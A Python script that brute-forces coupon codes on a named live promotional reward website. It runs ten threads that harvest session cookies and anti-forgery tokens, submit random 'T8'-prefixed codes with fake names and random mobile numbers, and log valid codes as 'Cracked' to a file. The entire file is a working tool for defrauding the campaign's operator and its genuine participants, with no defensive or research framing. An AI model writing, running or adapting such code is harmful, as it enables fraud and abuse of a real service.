import requests
from bs4 import BeautifulSoup
import random
from threading import Thread
import time
# List of proxies in the format IP:PORT:USERNAME:PASSWORD
def pause_with_countdown(seconds):
    for remaining in range(seconds, 0, -1):
        print(f"Pausing... Resuming in {remaining} seconds", end="\r")
        time.sleep(1)
    print("\nResuming execution...")

# Function to generate a random string
def generate_random_string(length):
    random_str_seq = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    return ''.join(random.choices(random_str_seq, k=length))

# List of names (shortened for brevity)
names = ['Abhilasha', 'Aishwarya', 'Amita', 'Anandita', 'Anila', 'Arya', 'Bhavani', 'Carma', 'Chandra']

# List of numbers
n = [91, 92, 93, 94, 95, 96, 97, 98, 99, 81, 82, 83, 86, 75, 73, 89, 62, 85, 63, 84, 79, 78, 77, 76, 72]

# Function to test codes
def tms():
    while True:
        try:
            # Generate a random code and name
            random_code = generate_random_string(5)
            random_number = random.randint(87, 89)
            code = f"T8{random_code}"
            random_name = random.choice(names)
            num = random.choice(n)
            random_number = ''.join([str(random.randint(0, 9)) for _ in range(8)])
            number = f"{num}{random_number}"

            

            # Initial URL
            url14 = 'https://hookstepchallenge.woohoo.in/'
            headers = {
                'Host': 'hookstepchallenge.woohoo.in',
                'User-Agent': ''
            }

            # First request to get cookies
            response = requests.get(url14, headers=headers)
            cookies = response.cookies.get_dict()

            # Extract .AspNetCore.Session cookie
            asp_net_core_session = cookies.get('.AspNetCore.Session', '')

            # Second request to /claimReward
            url_claim_reward = 'https://hookstepchallenge.woohoo.in/claimReward'
            headers.update({'Cookie': '; '.join([f"{k}={v}" for k, v in cookies.items()])})
            response = requests.get(url_claim_reward, headers=headers)

            # Parse the response to extract __RequestVerificationToken
            soup = BeautifulSoup(response.text, 'html.parser')
            request_verification_token = soup.find('input', {'name': '__RequestVerificationToken'})
            request_verification_token = request_verification_token['value'] if request_verification_token else None

            if not request_verification_token:
                print(f"RequestVerificationToken not found for code {code}.")
                pause_with_countdown(120)  # Pause for 1 minute with countdown
                continue
                

            # Update cookies after second request
            cookies.update(response.cookies.get_dict())

            # Third request to /ClaimReward/SaveData
            url_save_data = 'https://hookstepchallenge.woohoo.in/ClaimReward/SaveData'
            data = {
                'FIRSTNAME': random_name,
                'MOBILE': number,
                'COUPONCODE': code,
                'CHECKBOX1': 'on',
                'OTP': '',
                'REDEMPTIONTYPE': '',
                'curPage': '1',
                'maxPage': '3',
                'longi': '',
                'lat': '',
                'stateDropdown': '0',
                'cityDropdown': '0',
                'branchDropdown': '0',
                'retailerDropdown': '0',
                'couponCodeData': '',
                'parametersOccurance': '0',
                '__RequestVerificationToken': request_verification_token,
                'TextAnswers': '',
                'ChoiceAnswer': ''
            }
            headers.update({
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
            })
            cookies_str = '; '.join([f"{k}={v}" for k, v in cookies.items()])
            headers['Cookie'] = f".AspNetCore.Session={asp_net_core_session}; {cookies_str}"

            response = requests.post(url_save_data, headers=headers, data=data)
			
			#print(response.text)
            # Parse response
            result = response.json()
            pagno = result.get('pagno')
            message_body = result.get('messageBody')

            if pagno == "#Step2":
                with open('dance.txt', 'a') as wr:
                    wr.write(f"{code} \n")
                print(f"Cracked {code}: ")
            else:
                print(f"Trying {code}: {message_body}", end="\r")
        except Exception as e:
            print(f"Error: {e}")
            continue

# Start threads
for _ in range(10):
    Thread(target=tms).start()